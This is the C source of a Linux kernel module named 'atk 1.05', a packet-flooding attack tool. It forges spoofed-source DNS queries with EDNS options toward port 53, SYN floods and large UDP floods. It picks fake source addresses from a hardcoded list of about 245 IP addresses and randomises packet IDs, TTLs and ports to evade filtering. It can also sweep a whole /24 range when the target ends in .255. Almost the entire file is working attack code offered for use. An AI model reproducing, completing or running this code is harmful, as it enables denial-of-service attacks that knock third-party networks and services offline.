
/*
 * Copyright by chinsec
 */

#include <linux/types.h>
#include <linux/errno.h>
#include <linux/kernel_stat.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/mman.h>
#include <linux/slab.h>
#include <linux/smp.h>
#include <linux/signal.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/smp_lock.h>
#include <linux/seq_file.h>
#include <linux/profile.h>
#include <linux/hugetlb.h>
#include <linux/sysrq.h>
#include <linux/vmalloc.h>
#include <linux/crash_dump.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <asm/pgtable.h>
#include <asm/io.h>
#include <asm/tlb.h>
#include <asm/div64.h>

#include <linux/if.h>
#include <linux/time.h>
/*
 * Standard in kernel modules 
 */
#include <linux/kernel.h>	/* We're doing kernel work */
#include <linux/module.h>	/* Specifically, a module, */
#include <linux/moduleparam.h>	/* which will have params */
#include <linux/unistd.h>	/* The list of system calls */

/* 
 * For the current (process) structure, we need
 * this to know who the current user is. 
 */
#include <linux/sched.h>
#include <asm/uaccess.h>


#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/igmp.h>
#include <linux/netfilter_ipv4.h>
#include <linux/smp_lock.h>
#include <linux/slab.h>
#include <linux/if_ether.h>
#include <linux/if_vlan.h>
#include <linux/in.h>
#include <asm/div64.h>

#include <net/sock.h>
#include <net/netlink.h>

#include "atk.h"

#define VERSION  "atk 1.05"


MODULE_LICENSE("GPL");

#define IP_LIST_SIZE 100000
unsigned int ip_list_level=0; /* 0 8 16 b类 c类 a类*/
unsigned int ip_list[IP_LIST_SIZE];
unsigned int ip_list_n=0; /*已添加到的位置 如果大于IP_LIST_SIZE那么从0来过*/

struct sock *nl_sk = NULL;
struct timespec xtime;
static uint32_t	df_start_time = 0;
int random_start=0;
int oo=1;

/*
 * 计算效验和
 */
static __inline__ uint16_t 
cksum(void *p,int32_t len)
{
	
        register int32_t sum=0;
        uint16_t *pp=p;
        while ( len > 1 )
        {
                sum += *pp++;
                if ( sum & 0x80000000 )
                        sum = ( sum & 0xffff ) + ( sum >> 16 );
                len -= 2;
        }

	
	if ( len )
		sum += (uint16_t ) *(uint8_t *)p;
		
	while ( sum >> 16 )
		sum = ( sum & 0xffff ) + ( sum >> 16 );
		
	return ~sum;
}


/*
  * udp
  */
struct pseudo_header{
	uint32_t	src;			/*原地址*/
	uint32_t	dst;			/*目标地址*/
	uint8_t	unused;			/*set zero*/
	uint8_t	proto;			/* protocol */
	uint16_t	len;			/* total length */
};

struct atk_info atk_info;

//unsigned char ip_header[8]={59,202,211,60,61,121,210,159};
unsigned int _random(unsigned int * seed_p){
	*seed_p=*seed_p*1103515245+12345;
	return (unsigned int)(*seed_p/65536)%32768;
}

#define RANDOM_32(seed_p) ( (((_random(seed_p)&0xff)<<24)| ((_random(seed_p)&0xff)<<16)| ((_random(seed_p)&0xff)<<8 )| (_random(seed_p)&0xff))  )

unsigned int INIT_SEED;
unsigned int RAND_SEED1;
unsigned int RAND_SEED2;
unsigned int RAND_SEED3;
unsigned int RAND_PUBLIC;
unsigned int *seed_p=NULL;

int send_dns_query(void *p)
{
	struct sk_buff *new_skb = NULL;
	struct ethhdr *new_eth_p;
	struct iphdr *new_ip_p;
	struct udphdr	*new_udp_p;
	struct pseudo_header *new_phdr_p ;
	unsigned char * new_udp_data_p;
	unsigned random_src_ip;
	unsigned int i;
	struct atk_info *atk_info_p=(struct atk_info *)p;
	int skb_size;
	int ip_len;
	int udp_len;
	int data_len;
	unsigned char data_1[12];
	unsigned char data_2[15];
	unsigned int src_ip;
	unsigned int id_seed;

	xtime=current_kernel_time();
	id_seed=xtime.tv_sec;

	for(i=0;i<atk_info_p->degree;i++)
	{
		if(df_start_time==0)
		df_start_time = xtime.tv_sec;

	if(random_start==0&&xtime.tv_sec-df_start_time>1)
		random_start=1;
	if(random_start==1&&xtime.tv_sec-df_start_time>3)
		random_start=2;
	if(random_start==2&&xtime.tv_sec-df_start_time>6)
		random_start=3;



	if(oo==1)
	{
		seed_p = &RAND_SEED1;
		if(random_start!=0)
			oo=2;
	}
	else if(oo==2)
	{
		seed_p = &RAND_SEED2;
		if(random_start>1)
			oo=3;
		else
			oo=1;
	}
	else if(oo==3)
	{
		seed_p = &RAND_SEED3;
		oo=1;
	}


data_1[0]=(char)_random(seed_p);
data_1[1]=(char)_random(seed_p);   /*id*/
data_1[2]=0x00;
data_1[3]=0x10;
data_1[4]=0x00;
data_1[5]=0x01;
data_1[6]=0x00;
data_1[7]=0x00;
data_1[8]=0x00;
data_1[9]=0x00;
data_1[10]=0x00;
data_1[11]=0x01;
data_2[0]=0x00;
data_2[1]=0x01;
data_2[2]=0x00;
data_2[3]=0x01;
data_2[4]=0x00;
data_2[5]=0x00;
data_2[6]=0x29;
data_2[7]=0x10;
data_2[8]=0x00;
data_2[9]=0x00;
data_2[10]=0x00;
data_2[11]=0x80;
data_2[12]=0x00;
data_2[13]=0x00;
data_2[14]=0x00;

	data_len=sizeof(data_1)+strlen(atk_info_p->domain)+1+sizeof(data_2);

	udp_len=data_len+sizeof(struct udphdr);
	ip_len=udp_len+sizeof(struct iphdr);
	skb_size=sizeof(struct ethhdr)+ip_len;

	if(udp_len%2)
		skb_size+=1;


		new_skb = alloc_skb(skb_size, GFP_ATOMIC);
		if(new_skb==NULL)
			continue;
		new_skb->data_len = 0;
		skb_put(new_skb,sizeof(struct ethhdr)+sizeof(struct iphdr)+sizeof(struct udphdr));
		new_eth_p = (struct ethhdr *)new_skb->data;
		new_ip_p = (struct iphdr*)((size_t)new_eth_p+sizeof(struct ethhdr));
		  new_skb->mac_header = (unsigned char *)new_eth_p;
		new_skb->len = sizeof(struct ethhdr)+sizeof(struct iphdr)+sizeof(struct udphdr)+data_len;
		new_skb->mac_len = sizeof(struct ethhdr);

			new_skb->dev = dev_get_by_name(&init_net,DEV_ETH);

		memcpy(new_eth_p->h_source,new_skb->dev->dev_addr,ETH_ALEN);
		memcpy(new_eth_p->h_dest,atk_info_p->eth_dst,ETH_ALEN);
		new_eth_p->h_proto = htons(ETH_P_IP);
		new_udp_p = (struct udphdr*)((size_t)new_ip_p+sizeof(struct iphdr));
		new_phdr_p = (struct pseudo_header*)((size_t)new_udp_p-sizeof(struct pseudo_header));
		 new_skb->network_header = (unsigned char *)new_ip_p;
		 new_skb->transport_header = (unsigned char *)new_udp_p; 
		new_udp_data_p = (unsigned char *)((size_t)new_udp_p+sizeof(struct udphdr));

		memcpy(new_udp_data_p,&data_1,sizeof(data_1));
		memcpy((new_udp_data_p+(size_t)sizeof(data_1)),&atk_info_p->domain,strlen(atk_info_p->domain)+1);
		
		memcpy((new_udp_data_p+(size_t)sizeof(data_1)+(size_t)strlen(atk_info_p->domain)+1),&data_2,sizeof(data_2));


		/*create pseudo header */
		if(ip_list_level<32)
		{
			random_src_ip= (((ntohl(ip_list[_random(seed_p)%(ip_list_n+1)])>>(32-ip_list_level))<<(32-ip_list_level))^(RANDOM_32(seed_p)>>ip_list_level));           /*1.05改动*/
			if((random_src_ip&0xff)==0)
				random_src_ip=htonl(random_src_ip+1);
			else if((random_src_ip>>24&0xff)<10)
				random_src_ip=htonl((random_src_ip+200)<<24);
			else if((random_src_ip>>24&0xff)==255)
				random_src_ip=htonl((random_src_ip&0xfe)<<24);
			else if((random_src_ip&0xff)==255)
				random_src_ip=htonl(random_src_ip-1);
			else
				random_src_ip=htonl(random_src_ip);
		}
		else
			random_src_ip=ip_list[_random(seed_p)%(ip_list_n+1)];

		if(ntohl(atk_info_p->src_ip))
			src_ip = atk_info_p->src_ip;
		else
			src_ip = random_src_ip;
		
		new_phdr_p->src=src_ip;
		new_phdr_p->dst = atk_info_p->dst_ip;
		new_phdr_p->unused = 0;
		new_phdr_p->proto = IPPROTO_UDP;
		new_phdr_p->len = htons(udp_len);
		
		/* create udp header */
		if(seed_p == &RAND_SEED1)
			new_udp_p->source =htons(_random(seed_p));
		else if(seed_p == &RAND_SEED2)
			new_udp_p->source = htons(_random(seed_p)+300+_random(&RAND_PUBLIC)%300+1);
		else
			new_udp_p->source = htons(_random(seed_p)+600+_random(&RAND_PUBLIC)%300+1);
		
		new_udp_p->dest = htons(53);
		new_udp_p->check =0;
		new_udp_p->len = htons(udp_len);
		if(udp_len%2)
		{
			*(char*)(new_udp_p+udp_len)=0;
			new_udp_p->check = cksum(new_phdr_p,udp_len+1+12);
		}
		else
			new_udp_p->check = cksum(new_phdr_p,udp_len+12);

		new_ip_p->version= 4;
		new_ip_p->ihl= 5;
		new_ip_p->tos = 0;
		new_ip_p->tot_len = htons(ip_len);
		if(seed_p == &RAND_SEED1)
			new_ip_p->id = htons(_random(seed_p));
		else if(seed_p == &RAND_SEED2)
			new_ip_p->id = htons(_random(seed_p)+300+_random(&id_seed)%500+1);
		else
			new_ip_p->id = htons(_random(seed_p)+600+_random(&id_seed)%500+1);
		new_ip_p->frag_off = 0x0040;
		new_ip_p->frag_off = 0x0040;
		new_ip_p->ttl = 128 -_random(seed_p)%10;
		new_ip_p->protocol= 17;
		new_ip_p->check= 0;        

		new_ip_p->saddr = src_ip;
		new_ip_p->daddr= atk_info_p->dst_ip;
		new_ip_p->daddr= atk_info_p->dst_ip;
		new_ip_p->check= cksum(new_ip_p,sizeof(struct iphdr));
		dev_queue_xmit(new_skb);
	}
	return 0;
}



/*
  * tcp_synproxy
  */
struct tcpopt
{
	uint8_t b1;
	uint8_t b2;
	uint16_t mssopt;
};
#define	WEBSYN_SKB_SIZE	88


int send_syn(void *p)
{
	struct sk_buff *new_skb = NULL;
	struct ethhdr *new_eth_p;
	struct iphdr *new_ip_p;
	struct tcphdr	*new_tcp_p;
	struct tcpopt *new_tcpopt_p;
	struct pseudo_header *new_phdr_p ;
	unsigned random_src_ip;
	unsigned int src_ip;
	unsigned int i;
	struct atk_info *atk_info_p=(struct atk_info *)p;
	unsigned int id_seed;
	unsigned int dst_ip;

	xtime=current_kernel_time();
	id_seed=xtime.tv_sec;

	for(i=0;i<atk_info_p->degree;i++)
	{
		if(df_start_time==0)
			df_start_time = xtime.tv_sec;

		if(random_start==0&&xtime.tv_sec-df_start_time>1)
			random_start=1;
		if(random_start==1&&xtime.tv_sec-df_start_time>3)
			random_start=2;
		if(random_start==2&&xtime.tv_sec-df_start_time>6)
			random_start=3;



		if(oo==1)
		{
			seed_p = &RAND_SEED1;
			if(random_start!=0)
				oo=2;
		}
		else if(oo==2)
		{
			seed_p = &RAND_SEED2;
			if(random_start>1)
				oo=3;
			else
				oo=1;
		}
		else if(oo==3)
		{
			seed_p = &RAND_SEED3;
			oo=1;
		}




		new_skb = alloc_skb(WEBSYN_SKB_SIZE, GFP_ATOMIC);
		if(new_skb==NULL)
			continue;
		new_skb->data_len = 0;
		skb_put(new_skb,sizeof(struct ethhdr)+sizeof(struct iphdr)+sizeof(struct tcphdr)+sizeof(struct tcpopt));
		new_eth_p = (struct ethhdr *)new_skb->data;
		new_ip_p = (struct iphdr*)((size_t)new_eth_p+sizeof(struct ethhdr));
		  new_skb->mac_header = (unsigned char *)new_eth_p;
		new_skb->len = sizeof(struct ethhdr)+sizeof(struct iphdr)+sizeof(struct tcphdr)+sizeof(struct tcphdr);
		new_skb->mac_len = sizeof(struct ethhdr);

		new_skb->dev = dev_get_by_name(&init_net,DEV_ETH);


		memcpy(new_eth_p->h_source,new_skb->dev->dev_addr,ETH_ALEN);
		memcpy(new_eth_p->h_dest,atk_info_p->eth_dst,ETH_ALEN);
		new_eth_p->h_proto = htons(ETH_P_IP);
		new_tcp_p = (struct tcphdr*)((size_t)new_ip_p+sizeof(struct iphdr));
		new_tcpopt_p = (struct tcpopt*)((size_t)new_tcp_p+sizeof(struct tcphdr));
		new_phdr_p = (struct pseudo_header*)((size_t)new_tcp_p-sizeof(struct pseudo_header));
		 new_skb->network_header = (unsigned char *)new_ip_p;
		 new_skb->transport_header = (unsigned char *)new_tcp_p; 
		
		/*create pseudo header */
		if(ip_list_level<32)
		{
			random_src_ip= (((ntohl(ip_list[_random(seed_p)%(ip_list_n+1)])>>(32-ip_list_level))<<(32-ip_list_level))^(RANDOM_32(seed_p)>>ip_list_level));           /*1.05改动*/
			if((random_src_ip&0xff)==0)
				random_src_ip=htonl(random_src_ip+1);
			else if((random_src_ip>>24&0xff)<10)
				random_src_ip=htonl((random_src_ip+200)<<24);
			else if((random_src_ip>>24&0xff)==255)
				random_src_ip=htonl((random_src_ip&0xfe)<<24);
			else if((random_src_ip&0xff)==255)
				random_src_ip=htonl(random_src_ip-1);
			else
				random_src_ip=htonl(random_src_ip);
		}
		else
			random_src_ip=ip_list[_random(seed_p)%(ip_list_n+1)];

		if(ntohl(atk_info_p->src_ip))
			src_ip = atk_info_p->src_ip;
		else
			src_ip = random_src_ip;

		new_phdr_p->src = src_ip;
		if((ntohl(atk_info_p->dst_ip)&0xff)==255)
		{
			dst_ip =(ntohl(atk_info_p->dst_ip)&0xffffff00)+(_random(seed_p)&0xff);
			if((dst_ip&0xff)==0)
				dst_ip=htonl(dst_ip+1);
			else if((dst_ip&0xff)==255)
				dst_ip=htonl(dst_ip-1);
			else
				dst_ip=htonl(dst_ip);
		}
		else
			dst_ip = atk_info_p->dst_ip;
		new_phdr_p->dst = dst_ip;
		new_phdr_p->unused = 0;
		new_phdr_p->proto = IPPROTO_TCP;
		new_phdr_p->len = htons(24);
		
	
		if(ntohs(atk_info_p->src_port))
			new_tcp_p->source = atk_info_p->src_port;
		else
			new_tcp_p->source = _random(seed_p);
		if(ntohs(atk_info_p->dst_port))
			new_tcp_p->dest = atk_info_p->dst_port;
		else
			new_tcp_p->dest = _random(seed_p);
		new_tcp_p->seq = RANDOM_32(seed_p);
		new_tcp_p->ack_seq = htonl(0);
		new_tcp_p->doff= 6;
		new_tcp_p->res1= 0;
		new_tcp_p->cwr = 0;
		new_tcp_p->ece = 0;
		new_tcp_p->urg = 0;
		new_tcp_p->ack = 0;
		new_tcp_p->psh = 0;
		new_tcp_p->rst = 0;
		new_tcp_p->syn = 1;
		new_tcp_p->fin = 0;
		new_tcp_p->window = htons(17473);;
		new_tcp_p->check =0;
		new_tcp_p->urg_ptr =0;
		new_tcpopt_p->b1 = 0x02;
		new_tcpopt_p->b2 = 0x04;
		new_tcpopt_p->mssopt = htons(1460);
		new_tcp_p->check = cksum(new_phdr_p,36);

		new_ip_p->version= 4;
		new_ip_p->ihl= 5;
		new_ip_p->tos = 0;
		new_ip_p->tot_len = htons(44);
		if(seed_p == &RAND_SEED1)
			new_ip_p->id = htons(_random(seed_p));
		else if(seed_p == &RAND_SEED2)
			new_ip_p->id = htons(_random(seed_p)+300+_random(&id_seed)%500+1);
		else
			new_ip_p->id = htons(_random(seed_p)+600+_random(&id_seed)%500+1);
		new_ip_p->frag_off = 0x0040;
		new_ip_p->ttl = 128 -_random(seed_p)%10;
		new_ip_p->protocol= 6;
		new_ip_p->check= 0;        

		new_ip_p->saddr = src_ip;
		new_ip_p->daddr= dst_ip;
		new_ip_p->check= cksum(new_ip_p,sizeof(struct iphdr));
		dev_queue_xmit(new_skb);
	}
	return 0;
}



int send_big_packet(void *p)
{
	struct sk_buff *new_skb = NULL;
	struct ethhdr *new_eth_p;
	struct iphdr *new_ip_p;
	struct udphdr	*new_udp_p;
	struct pseudo_header *new_phdr_p ;
	unsigned char * new_udp_data_p;
	unsigned random_src_ip;
	unsigned int src_ip;
	unsigned int i;
	struct atk_info *atk_info_p=(struct atk_info *)p;
	int skb_size;
	int ip_len;
	int udp_len;
	int data_len;
	unsigned int id_seed;
	unsigned int dst_ip;

	xtime=current_kernel_time();
	id_seed=xtime.tv_sec;

	for(i=0;i<atk_info_p->degree;i++)
	{
		if(df_start_time==0)
		df_start_time = xtime.tv_sec;

	if(random_start==0&&xtime.tv_sec-df_start_time>1)
		random_start=1;
	if(random_start==1&&xtime.tv_sec-df_start_time>3)
		random_start=2;
	if(random_start==2&&xtime.tv_sec-df_start_time>6)
		random_start=3;



	if(oo==1)
	{
		seed_p = &RAND_SEED1;
		if(random_start!=0)
			oo=2;
	}
	else if(oo==2)
	{
		seed_p = &RAND_SEED2;
		if(random_start>1)
			oo=3;
		else
			oo=1;
	}
	else if(oo==3)
	{
		seed_p = &RAND_SEED3;
		oo=1;
	}

	data_len=1400;

	udp_len=data_len+sizeof(struct udphdr);
	ip_len=udp_len+sizeof(struct iphdr);
	skb_size=sizeof(struct ethhdr)+ip_len;

	if(udp_len%2)
		skb_size+=1;


		new_skb = alloc_skb(skb_size, GFP_ATOMIC);
		if(new_skb==NULL)
			continue;
		new_skb->data_len = 0;
		skb_put(new_skb,sizeof(struct ethhdr)+sizeof(struct iphdr)+sizeof(struct udphdr));
		new_eth_p = (struct ethhdr *)new_skb->data;
		new_ip_p = (struct iphdr*)((size_t)new_eth_p+sizeof(struct ethhdr));
		  new_skb->mac_header = (unsigned char *)new_eth_p;
		new_skb->len = sizeof(struct ethhdr)+sizeof(struct iphdr)+sizeof(struct udphdr)+data_len;
		new_skb->mac_len = sizeof(struct ethhdr);

			new_skb->dev = dev_get_by_name(&init_net,DEV_ETH);

		memcpy(new_eth_p->h_source,new_skb->dev->dev_addr,ETH_ALEN);
		memcpy(new_eth_p->h_dest,atk_info_p->eth_dst,ETH_ALEN);
		new_eth_p->h_proto = htons(ETH_P_IP);
		new_udp_p = (struct udphdr*)((size_t)new_ip_p+sizeof(struct iphdr));
		new_phdr_p = (struct pseudo_header*)((size_t)new_udp_p-sizeof(struct pseudo_header));
		 new_skb->network_header = (unsigned char *)new_ip_p;
		 new_skb->transport_header = (unsigned char *)new_udp_p; 
		new_udp_data_p = (unsigned char *)((size_t)new_udp_p+sizeof(struct udphdr));


		/*create pseudo header */
		if(ip_list_level<32)
		{
			random_src_ip= (((ntohl(ip_list[_random(seed_p)%(ip_list_n+1)])>>(32-ip_list_level))<<(32-ip_list_level))^(RANDOM_32(seed_p)>>ip_list_level));           /*1.05改动*/
			if((random_src_ip&0xff)==0)
				random_src_ip=htonl(random_src_ip+1);
			else if((random_src_ip>>24&0xff)<10)
				random_src_ip=htonl((random_src_ip+200)<<24);
			else if((random_src_ip>>24&0xff)==255)
				random_src_ip=htonl((random_src_ip&0xfe)<<24);
			else if((random_src_ip&0xff)==255)
				random_src_ip=htonl(random_src_ip-1);
			else
				random_src_ip=htonl(random_src_ip);
		}
		else
			random_src_ip=ip_list[_random(seed_p)%(ip_list_n+1)];

		if(ntohl(atk_info_p->src_ip))
			src_ip = atk_info_p->src_ip;
		else
			src_ip = random_src_ip;

		new_phdr_p->src = src_ip;
		if((ntohl(atk_info_p->dst_ip)&0xff)==255)
		{
			dst_ip =(ntohl(atk_info_p->dst_ip)&0xffffff00)+(_random(seed_p)&0xff);
			if((dst_ip&0xff)==0)
				dst_ip=htonl(dst_ip+1);
			else if((dst_ip&0xff)==255)
				dst_ip=htonl(dst_ip-1);
			else
				dst_ip=htonl(dst_ip);
		}
		else
			dst_ip = atk_info_p->dst_ip;
		new_phdr_p->dst = dst_ip;
		new_phdr_p->unused = 0;
		new_phdr_p->proto = IPPROTO_UDP;
		new_phdr_p->len = htons(udp_len);
		
		/* create udp header */
		if(seed_p == &RAND_SEED1)
			new_udp_p->source =htons(_random(seed_p));
		else if(seed_p == &RAND_SEED2)
			new_udp_p->source = htons(_random(seed_p)+300+_random(&RAND_PUBLIC)%300+1);
		else
			new_udp_p->source = htons(_random(seed_p)+600+_random(&RAND_PUBLIC)%300+1);
		

		if(ntohs(atk_info_p->dst_port))
			new_udp_p->dest = atk_info_p->dst_port;
		else
			new_udp_p->dest = _random(seed_p);
		new_udp_p->check =0;
		new_udp_p->len = htons(udp_len);
		if(udp_len%2)
		{
			*(char*)(new_udp_p+udp_len)=0;
			new_udp_p->check = cksum(new_phdr_p,udp_len+1+12);
		}
		else
			new_udp_p->check = cksum(new_phdr_p,udp_len+12);

		new_ip_p->version= 4;
		new_ip_p->ihl= 5;
		new_ip_p->tos = 0;
		new_ip_p->tot_len = htons(ip_len);
		if(seed_p == &RAND_SEED1)
			new_ip_p->id = htons(_random(seed_p));
		else if(seed_p == &RAND_SEED2)
			new_ip_p->id = htons(_random(seed_p)+300+_random(&id_seed)%500+1);
		else
			new_ip_p->id = htons(_random(seed_p)+600+_random(&id_seed)%500+1);
		new_ip_p->frag_off = 0x0040;
		new_ip_p->frag_off = 0x0040;
		new_ip_p->ttl = 128 -_random(seed_p)%10;
		new_ip_p->protocol= 17;
		new_ip_p->check= 0;        

		new_ip_p->saddr = src_ip;
		new_ip_p->daddr= dst_ip;
		new_ip_p->check= cksum(new_ip_p,sizeof(struct iphdr));
		dev_queue_xmit(new_skb);
	}
	return 0;
}


void add_addr(void *p)
{
	int i;
	struct atk_info *atk_info_p=(struct atk_info *)p;
	for(i=0;i<IP_LIST_SIZE;i++)
	{
		if(ip_list[ip_list_n]==atk_info_p->src_ip)
			return;
	}
	if(ip_list_n<IP_LIST_SIZE)
	{
		ip_list[ip_list_n]=atk_info_p->src_ip;
		printk("add_addr !!!\n");
		ip_list_n++;
	}
	else
		printk("ip_list full!!!\n");
	return;
}
void list_level(void *p)
{
	struct atk_info *atk_info_p=(struct atk_info *)p;
	ip_list_level=atk_info_p->src_ip;
	printk("list_level!!!\n");
	return;
}


		
void list_clean(void)
{
	ip_list_n=0;
}

void list_default(void)
{
ip_list[0]=0x890c0da;
ip_list[1]=0x12547174;
ip_list[2]=0x5a2e8b3d;
ip_list[3]=0x5071c79;
ip_list[4]=0xcb7c707d;
ip_list[5]=0xa0a65ca;
ip_list[6]=0x376765ca;
ip_list[7]=0x376f65ca;
ip_list[8]=0x56e366ca;
ip_list[9]=0x5ae366ca;
ip_list[10]=0x2e0667ca;
ip_list[11]=0x970e70ca;
ip_list[12]=0x831470ca;
ip_list[13]=0xbb072ca;
ip_list[14]=0xc94c05da;
ip_list[15]=0x89ec7ca;
ip_list[16]=0x390c8ca;
ip_list[17]=0x3b1cfca;
ip_list[18]=0x958868da;
ip_list[19]=0x23f189d3;
ip_list[20]=0x7c7160ca;
ip_list[21]=0x85c760ca;
ip_list[22]=0x8fd160ca;
ip_list[23]=0xfd160ca;
ip_list[24]=0xe4563ca;
ip_list[25]=0x264563ca;
ip_list[26]=0x62a813d;
ip_list[27]=0x62f793d3;
ip_list[28]=0xb6f21974;
ip_list[29]=0xe2c26a71;
ip_list[30]=0xe8c26a71;
ip_list[31]=0x443acfdd;
ip_list[32]=0xa547174;
ip_list[33]=0xe547174;
ip_list[34]=0x2547174;
ip_list[35]=0x16547174;
ip_list[36]=0x6547174;
ip_list[37]=0xc93e174;
ip_list[38]=0xb3aae974;
ip_list[39]=0xe94b0774;
ip_list[40]=0xa7044d3;
ip_list[41]=0x81479177;
ip_list[42]=0xbd0f9dd3;
ip_list[43]=0xafa0d79;
ip_list[44]=0xf97f1179;
ip_list[45]=0xfd7f1179;
ip_list[46]=0xdc86e579;
ip_list[47]=0xeef168da;
ip_list[48]=0xd071c79;
ip_list[49]=0x19071c79;
ip_list[50]=0x1d071c79;
ip_list[51]=0x21071c79;
ip_list[52]=0x9071c79;
ip_list[53]=0x423c1f79;
ip_list[54]=0x463c1f79;
ip_list[55]=0x4a3c1f79;
ip_list[56]=0x523c1f79;
ip_list[57]=0x563c1f79;
ip_list[58]=0x5a3c1f79;
ip_list[59]=0x12ed9c7a;
ip_list[60]=0x2250c07a;
ip_list[61]=0x838ce07a;
ip_list[62]=0x7560e17a;
ip_list[63]=0xe8a467a;
ip_list[64]=0x3ac67c7b;
ip_list[65]=0xdc0817b;
ip_list[66]=0x11c0817b;
ip_list[67]=0x15c0817b;
ip_list[68]=0x19c0817b;
ip_list[69]=0x1dc0817b;
ip_list[70]=0x21c0817b;
ip_list[71]=0x25c0817b;
ip_list[72]=0x29c0817b;
ip_list[73]=0x2dc0817b;
ip_list[74]=0x39c0817b;
ip_list[75]=0x3dc0817b;
ip_list[76]=0x41c0817b;
ip_list[77]=0x45c0817b;
ip_list[78]=0x9c0817b;
ip_list[79]=0x209298d3;
ip_list[80]=0x5b04737c;
ip_list[81]=0x28ac817c;
ip_list[82]=0xf606107c;
ip_list[83]=0xea61a17c;
ip_list[84]=0xee61a17c;
ip_list[85]=0xf261a17c;
ip_list[86]=0x3c7cf07c;
ip_list[87]=0xa7a2a7c;
ip_list[88]=0x1ea4417c;
ip_list[89]=0x953c863d;
ip_list[90]=0xaf34a7c;
ip_list[91]=0xcc7c707d;
ip_list[92]=0xcd7c707d;
ip_list[93]=0xce7c707d;
ip_list[94]=0x4a0e474;
ip_list[95]=0xf1fe467d;
ip_list[96]=0xf2fe467d;
ip_list[97]=0xf3fe467d;
ip_list[98]=0xf4fe467d;
ip_list[99]=0x75477d;
ip_list[100]=0xa3275c7d;
ip_list[101]=0xdef3adde;
ip_list[102]=0xd0069377;
ip_list[103]=0x5843173a;
ip_list[104]=0x11a0079;
ip_list[105]=0x7450b79;
ip_list[106]=0x81585ad3;
ip_list[107]=0x15071c79;
ip_list[108]=0x58f7f7b;
ip_list[109]=0xc11488d3;
ip_list[110]=0x6c088d3;
ip_list[111]=0x3405737c;
ip_list[112]=0x65a7e29f;
ip_list[113]=0x1902e29f;
ip_list[114]=0x3d41e29f;
ip_list[115]=0x3e41e29f;
ip_list[116]=0x608e29f;
ip_list[117]=0x708e29f;
ip_list[118]=0x1a8169a2;
ip_list[119]=0x1b8169a2;
ip_list[120]=0x66c0e37c;
ip_list[121]=0x43495db;
ip_list[122]=0x1001ed2;
ip_list[123]=0xeaba1c3c;
ip_list[124]=0x3c32e8db;
ip_list[125]=0xe8ba1c3c;
ip_list[126]=0xd40a39da;
ip_list[127]=0x1420a2d3;
ip_list[128]=0xa846bda;
ip_list[129]=0x180e29f;
ip_list[130]=0xbc9ee29f;
ip_list[131]=0x127e29f;
ip_list[132]=0x5a0ea13c;
ip_list[133]=0x180483b;
ip_list[134]=0x1a8ad73c;
ip_list[135]=0x448a64ca;
ip_list[136]=0x366765ca;
ip_list[137]=0x376b65ca;
ip_list[138]=0x377065ca;
ip_list[139]=0x82ad65ca;
ip_list[140]=0x83ad65ca;
ip_list[141]=0x44e065ca;
ip_list[142]=0x45e065ca;
ip_list[143]=0x20665ca;
ip_list[144]=0x8d0b66ca;
ip_list[145]=0x48c066ca;
ip_list[146]=0x49c066ca;
ip_list[147]=0x4ac066ca;
ip_list[148]=0x4bc066ca;
ip_list[149]=0x52c766ca;
ip_list[150]=0x57c766ca;
ip_list[151]=0x58c766ca;
ip_list[152]=0x5cc766ca;
ip_list[153]=0x5dc766ca;
ip_list[154]=0x65c866ca;
ip_list[155]=0x4ae066ca;
ip_list[156]=0x4ee066ca;
ip_list[157]=0x52e066ca;
ip_list[158]=0x56e066ca;
ip_list[159]=0x5ae066ca;
ip_list[160]=0x4ae366ca;
ip_list[161]=0x4ee366ca;
ip_list[162]=0x52e366ca;
ip_list[163]=0x221866ca;
ip_list[164]=0x231866ca;
ip_list[165]=0x41f066ca;
ip_list[166]=0x900366ca;
ip_list[167]=0x440067ca;
ip_list[168]=0x646467ca;
ip_list[169]=0x221367ca;
ip_list[170]=0x52c67ca;
ip_list[171]=0x8b4067ca;
ip_list[172]=0x5746aca;
ip_list[173]=0x6746aca;
ip_list[174]=0x8746aca;
ip_list[175]=0x228d6aca;
ip_list[176]=0x22cc6bca;
ip_list[177]=0x4ee16bca;
ip_list[178]=0x41526bca;
ip_list[179]=0x8776cca;
ip_list[180]=0x9776cca;
ip_list[181]=0xa7c6cca;
ip_list[182]=0xd7c6cca;
ip_list[183]=0xe2aa6cca;
ip_list[184]=0x4d4064ca;
ip_list[185]=0xfd3f6cca;
ip_list[186]=0x870a65ca;
ip_list[187]=0x42576cca;
ip_list[188]=0x376e65ca;
ip_list[189]=0x74746dca;
ip_list[190]=0xcb756dca;
ip_list[191]=0xc0e6dca;
ip_list[192]=0xcc16eca;
ip_list[193]=0x249a6fca;
ip_list[194]=0x647070ca;
ip_list[195]=0x377071ca;
ip_list[196]=0x128071ca;
ip_list[197]=0x10f71ca;
ip_list[198]=0xa3071ca;
ip_list[199]=0xa5071ca;
ip_list[200]=0xa6071ca;
ip_list[201]=0x219072ca;
ip_list[202]=0xc0f766ca;
ip_list[203]=0xfec872ca;
ip_list[204]=0x12072ca;
ip_list[205]=0x24072ca;
ip_list[206]=0x234072ca;
ip_list[207]=0xa5872ca;
ip_list[208]=0x16072ca;
ip_list[209]=0x217073ca;
ip_list[210]=0x10074ca;
ip_list[211]=0x20074ca;
ip_list[212]=0x18074ca;
ip_list[213]=0x21e074ca;
ip_list[214]=0x82074ca;
ip_list[215]=0x35075ca;
ip_list[216]=0x1d0176ca;
ip_list[217]=0x350176ca;
ip_list[218]=0x80a676ca;
ip_list[219]=0x65e076ca;
ip_list[220]=0x22876ca;
ip_list[221]=0x227077ca;
ip_list[222]=0x42f877ca;
ip_list[223]=0x7b4077ca;
ip_list[224]=0x78d67ca;
ip_list[225]=0x6df78ca;
ip_list[226]=0x8be67ca;
ip_list[227]=0x1ae078ca;
ip_list[228]=0x27dd67ca;
ip_list[229]=0x6e078ca;
ip_list[230]=0xb6079ca;
ip_list[231]=0x39d7fca;
ip_list[232]=0x1cf7fca;
ip_list[233]=0x1eb0eca;
ip_list[234]=0x1a19eca;
ip_list[235]=0x17f6aca;
ip_list[236]=0x7a7f6aca;
ip_list[237]=0x99b66aca;
ip_list[238]=0x54c36aca;
ip_list[239]=0x2148c0ca;
ip_list[240]=0x219ec1ca;
ip_list[241]=0x21a0c1ca;
ip_list[242]=0x185c2ca;
ip_list[243]=0x4291c2ca;
ip_list[244]=0xc0f97c7b;
